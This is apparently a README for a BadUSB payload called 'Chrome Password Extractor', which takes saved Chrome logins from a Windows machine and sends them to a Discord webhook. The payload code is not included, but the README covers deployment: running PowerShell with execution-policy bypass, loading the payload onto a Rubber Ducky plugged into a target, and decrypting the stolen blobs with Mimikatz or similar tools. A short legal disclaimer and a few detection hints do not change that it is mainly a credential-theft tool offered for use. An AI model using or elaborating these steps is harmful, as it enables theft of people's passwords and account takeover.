```
▄▄▄▄▄▄    ▄▄▄▄▄       ▄▄▄▄▄▄     ▄▄▄▄▄▄  
▄▀   ░  ▀▄ █     ▀▀▄  ▄▀   ░  ▀▄ ▄▀   ░  ▀▄
█ ░▄▀▀▄ ░░ █ ░█▀▄   ▒ █ ░▄▀▀▄ ░░ █ ░▄▀▀▄ ░░
█ ░▒  █░ ▒ █▒░█  █░ ▓ █ ░▒  █▄▀  █ ░▒  █░ ▒
█░░▓  █░░▓ █▒▒▒▄▀░▒░█ █░░▓▄ ▀    █░░▓  █░░▓
█▒░█  █▒▒█ █▒▒▒░░▒▄▀  █▒░▒▒▀▄    █▒░█  █▒▒█
█▒▓▓  ▓▓▓█ █▒▓█▀▄▒▒█  █▒▓▓▀▀▀    █▒▓▓  ▓▓▓█
█▓▓▒  ▒█▓▓ █▓▓█ █▓▒█  █▓▓▒  ▒▄▄  █▓▓▒  ▒█▓▓
██▓░  ░██▒ ▒███ ▒▓██  ██▓░  ░██▒ ██▓░  ░██▒
█ █▀▄▄▀██░ ░██▓ ░██▓  █ █▀▄▄▀██░ █ █▀▄▄▀██░
▀▄      ▄  ▀▄█▒ ▀▄█▒  ▀▄      ▄  ▀▄      ▄ 
  ▀▀▀▀▀▀     ▀░   ▀░    ▀▀▀▀▀▀     ▀▀▀▀▀▀  
```

# 🔑 Chrome Password Extractor

A BadUSB payload that extracts saved Chrome login data (URLs, usernames, password metadata) and uploads to a Discord webhook.

## ⚠️ Legal Warning

**For authorized penetration testing only. Unauthorized use is illegal.**

## Description

Extracts:
- Website URLs
- Saved usernames/emails
- Password length (in bytes)
- Creation date
- Username count per site

**Important:** Chrome encrypts passwords with DPAPI (Windows Data Protection API). This payload extracts metadata and the encrypted password blobs. To decrypt, you need:
- The user's Windows credentials, OR
- Mimikatz's `dpapi` module, OR
- A tool like `SharpChrome` or `ChromePass` (run as the user)

## Requirements

- Windows 10/11
- PowerShell 5+
- .NET Framework
- Chrome installed
- Discord webhook URL

## Setup

1. Create Discord webhook (Server Settings → Integrations)
2. Replace `YOUR_DISCORD_WEBHOOK_URL` in payload
3. **Never commit the real webhook**

## Deployment

**CMD (as Admin):**
```batch
powershell -NoProfile -ExecutionPolicy Bypass -Command "[payload here]"
```

**Rubber Ducky:**
1. Encode `payload.txt` at https://hak5.github.io/usbrubberducky-payloads/
2. Copy `inject.bin` to Ducky
3. Plug into target

## Testing

1. Use a VM
2. Log into a few sites in Chrome
3. Run payload
4. Verify file arrives in Discord

## Limitations

- Chrome must be installed
- Chrome must be closed or user must be logged in (Login Data may be locked)
- Encrypted passwords require additional steps to decrypt

## Detection

Defenders should monitor for:
- Access to `Login Data` files
- SQLite queries to Chrome databases
- `System.Data.SQLite` loading in PowerShell
- Outbound Discord traffic

## License

MIT — use at your own risk.
